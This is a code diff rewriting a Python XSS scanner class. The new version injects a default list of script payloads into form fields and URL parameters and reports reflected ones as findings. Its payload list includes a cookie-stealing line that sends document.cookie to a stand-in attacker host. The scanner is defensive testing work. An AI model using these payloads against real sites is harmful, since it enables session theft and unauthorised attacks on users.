@@ -1,12 +1,16 @@
+# -*- coding: utf-8 -*-
 import asyncio
-import uuid # Import uuid
-from typing import List, Optional, Dict, Any
-
-import httpx # Assuming httpx is used for async http requests
+from datetime import datetime
+from typing import List, Dict
+import httpx
+import re
 from backend.scanners.base_scanner import BaseScanner
 from backend.scanners.scanner_registry import ScannerRegistry
-from backend.types.models import ScanInput, Finding, Severity, OwaspCategory, RequestLog # Import Severity, OwaspCategory, and RequestLog
+from backend.types.models import ScanInput, Severity, OwaspCategory
+from backend.utils.circuit_breaker import circuit_breaker
+from backend.utils.logging_config import get_context_logger
 
+logger = get_context_logger(__name__)
 
 class XssScanner(BaseScanner):
     """
@@ -21,83 +25,135 @@ class XssScanner(BaseScanner):
         "version": "1.0"
     }
 
-    async def _perform_scan(self, target: str, options: Dict) -> List[Finding]:
+    @circuit_breaker(failure_threshold=3, recovery_timeout=30.0, name="xss_scanner")
+    async def scan(self, scan_input: ScanInput) -> List[Dict]:
         """
-        Asynchronously scans a target for potential XSS vulnerabilities.
-
-        Args:
-            target: The target information for the scan.
-            options: Additional options for the scan.
-
-        Returns:
-            A list of Finding objects representing potential XSS vulnerabilities found.
+        This is the entry point for the scanner. It will delegate to the
+        private _perform_scan method. The boilerplate for logging, metrics,
+        and broadcasting is handled by higher-level components.
         """
-        findings: List[Finding] = []
-        target_url = target
+        return await self._perform_scan(scan_input.target, scan_input.options or {})
 
-        # Basic placeholder logic for XSS detection
-        # In a real-world scenario, this would involve:
-        # - Sending crafted payloads in parameters and headers
-        # - Analyzing the response for reflected payloads or DOM manipulation
-        # - Considering different XSS types (reflected, stored, DOM-based)
-        # - Using a headless browser for DOM-based XSS detection
+    async def _perform_scan(self, target: str, options: Dict) -> List[Dict]:
+        """
+        Perform the actual XSS vulnerability scan.
+        """
+        findings: List[Dict] = []
+        logger.info("Starting XSS scan", extra={"target": target})
 
-        print(f"[*] Scanning {target_url} for XSS vulnerabilities...")
+        test_payloads = options.get('payloads', [
+            '<script>alert(1)</script>',
+            '"><script>alert(1)</script>',
+            '"><img src=x onerror=alert(1)>',
+            '"><svg/onload=alert(1)>',
+            'javascript:alert(1)',
+            '"><script>fetch(`http://attacker.com?cookie=${document.cookie}`)</script>'
+        ])
 
-        async with httpx.AsyncClient(follow_redirects=True) as client:
-            try:
-                # Example: Make an asynchronous request to the target
-                response = await client.get(str(target_url))
-                response.raise_for_status() # Raise an exception for bad status codes
- 
-                # Placeholder for checking response for XSS indicators
-                # In a real scenario, you would analyze the response body, headers, etc.
-                # for signs of vulnerability after injecting payloads.
-                if "<script>" in response.text: # Very simplistic check
-                    findings.append(
-                        Finding(
-                            id=str(uuid.uuid4()), # Assign a unique ID
-                            vulnerability_type="Potential Stored XSS Indicator", # Renamed to vulnerability_type
-                    description=(
-                                "Found indicators of potential stored XSS on a page likely containing user-supplied content: " + str(target_url) + "."), # Convert HttpUrl to string
-                            severity=Severity.MEDIUM, # Use Severity enum
-                            owasp_category=OwaspCategory.A03_INJECTION, # Use OwaspCategory enum
-                            affected_url=str(target_url), # Use affected_url and ensure it's a string
-                            technical_details=f"Response snippet: {response.text[:500]}...", # Example technical details
-                    proof={
-                                "url": str(target_url),
-                        "indicator": "Presence of unescaped user input in HTML context." # Placeholder for proof indicator
-                            },
-                            request=RequestLog(
-                                method="GET",
-                                url=str(target_url),
-                                headers=dict(response.request.headers) # Capture request headers
-                            ),
-                            response=response.text[:500] # Store a snippet of the response body
-                )
-                    )
-            except httpx.HTTPStatusError as e:
-                print(f"HTTP error while scanning {target_url}: {e}")
-            except httpx.RequestError as e:
-                print(f"Request error while scanning {target_url}: {e}")
-            except Exception as e:
-                print(f"An unexpected error occurred during XSS scan of {target_url}: {e}")
+        test_params = options.get('parameters', [
+            'q', 'search', 'id', 'input', 'query', 'keyword',
+            'name', 'user', 'username', 'email', 'message',
+            'comment', 'content', 'text', 'data'
+        ])
 
-        print(f"[*] XSS scan of {target_url} completed.")
+        try:
+            async with httpx.AsyncClient(timeout=30) as client:
+                response = await client.get(target)
+                content = response.text
 
+                forms = re.findall(r'<form[^>]*>.*?</form>', content, re.DOTALL)
+                
+                for form in forms:
+                    form_action_match = re.search(r'action=["\']([^"\']*)["\']', form)
+                    form_method_match = re.search(r'method=["\']([^"\']*)["\']', form)
+
+                    if form_action_match:
+                        form_url = form_action_match.group(1)
+                        if not form_url.startswith(('http://', 'https://')):
+                            form_url = f"{target.rstrip('/')}/{form_url.lstrip('/')}"
+
+                        method = form_method_match.group(1).upper() if form_method_match else 'POST'
+
+                        for payload in test_payloads:
+                            try:
+                                if method == 'GET':
+                                    # Assuming the first test_param is the most likely for GET forms
+                                    test_url = f"{form_url}?{test_params[0]}={payload}"
+                                    response = await client.get(test_url)
+                                else:
+                                    data = {param: payload for param in test_params}
+                                    response = await client.post(form_url, data=data)
+
+                                if payload in response.text:
+                                    logger.info("Potential XSS vulnerability detected in form", extra={
+                                        "url": form_url,
+                                        "method": method,
+                                        "payload": payload
+                                    })
+                                    findings.append({
+                                        "type": "reflected_xss",
+                                        "severity": Severity.HIGH,
+                                        "title": "Reflected XSS Vulnerability",
+                                        "description": f"Found reflected XSS vulnerability in form submission to {form_url}",
+                                        "evidence": {
+                                            "url": form_url,
+                                            "method": method,
+                                            "payload": payload,
+                                            "reflection": response.text[:200]
+                                        },
+                                        "owasp_category": OwaspCategory.INJECTION,
+                                        "remediation": "Implement proper input validation and output encoding. Use Content-Security-Policy headers and consider using a Web Application Firewall (WAF)."
+                                    })
+                            except Exception as e:
+                                logger.warning("Error testing XSS payload for form", extra={
+                                    "url": form_url,
+                                    "payload": payload,
+                                    "error": str(e)
+                                })
+                                continue
+
+                for param in test_params:
+                    for payload in test_payloads:
+                        try:
+                            test_url = f"{target}?{param}={payload}"
+                            response = await client.get(test_url)
+
+                            if payload in response.text:
+                                logger.info("Potential XSS vulnerability detected in URL parameter", extra={
+                                    "url": test_url,
+                                    "parameter": param,
+                                    "payload": payload
+                                })
+                                findings.append({
+                                    "type": "reflected_xss",
+                                    "severity": Severity.HIGH,
+                                    "title": "Reflected XSS in URL Parameter",
+                                    "description": f"Found reflected XSS in '{param}' parameter",
+                                    "evidence": {
+                                        "url": test_url,
+                                        "parameter": param,
+                                        "payload": payload,
+                                        "reflection": response.text[:200]
+                                    },
+                                    "owasp_category": OwaspCategory.INJECTION,
+                                    "remediation": "Implement proper input validation and output encoding. Use Content-Security-Policy headers and consider using a Web Application Firewall (WAF)."
+                                })
+                        except Exception as e:
+                            logger.warning("Error testing XSS payload for URL parameter", extra={
+                                "url": test_url,
+                                "parameter": param,
+                                "payload": payload,
+                                "error": str(e)
+                            })
+                            continue
+        except Exception as e:
+            logger.error("Unexpected error during XSS scan", extra={
+                "target": target,
+                "error": str(e)
+            }, exc_info=True)
+
+        logger.info("Finished XSS scan", extra={
+            "target": target,
+            "findings_count": len(findings)
+        })
         return findings
-
-
-def register(scanner_registry: ScannerRegistry) -> None:
-    """
-    Register this scanner with the scanner registry.
-
-    Args:
-        scanner_registry: The scanner registry instance.
-    """
-    scanner_registry.register("xss", XssScanner)
-
-# Example of how this might be used (for testing purposes)
-# async def main():
-#     scanner = XssScanner()
-#     scan_input = ScanInput(target="http://example.com/vulnerable_to_
